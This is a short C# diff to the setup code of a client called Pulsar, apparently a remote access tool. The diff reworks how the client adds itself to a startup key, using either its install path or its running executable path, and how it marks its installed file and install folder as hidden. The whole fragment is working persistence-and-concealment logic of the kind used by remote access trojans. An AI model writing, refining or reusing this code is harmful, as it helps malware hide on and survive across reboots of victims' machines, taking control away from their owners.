@@ -16,31 +16,38 @@ namespace Pulsar.Client.Setup
             if (Settings.STARTUP)
             {
                 var clientStartup = new ClientStartup();
-                clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
-            }
+                if (Settings.INSTALL)
+                {
+                    clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
+                }
+                else
+                {
+                    clientStartup.AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
+                }
 
-            if (Settings.INSTALL && Settings.HIDEFILE)
-            {
-                try
+                if (Settings.INSTALL && Settings.HIDEFILE)
                 {
-                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
+                    try
+                    {
+                        File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine(ex);
+                    }
                 }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine(ex);
-                }
-            }
 
-            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
-            {
-                try
+                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
                 {
-                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
-                    di.Attributes |= FileAttributes.Hidden;
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine(ex);
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
+                        di.Attributes |= FileAttributes.Hidden;
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine(ex);
+                    }
                 }
             }
         }
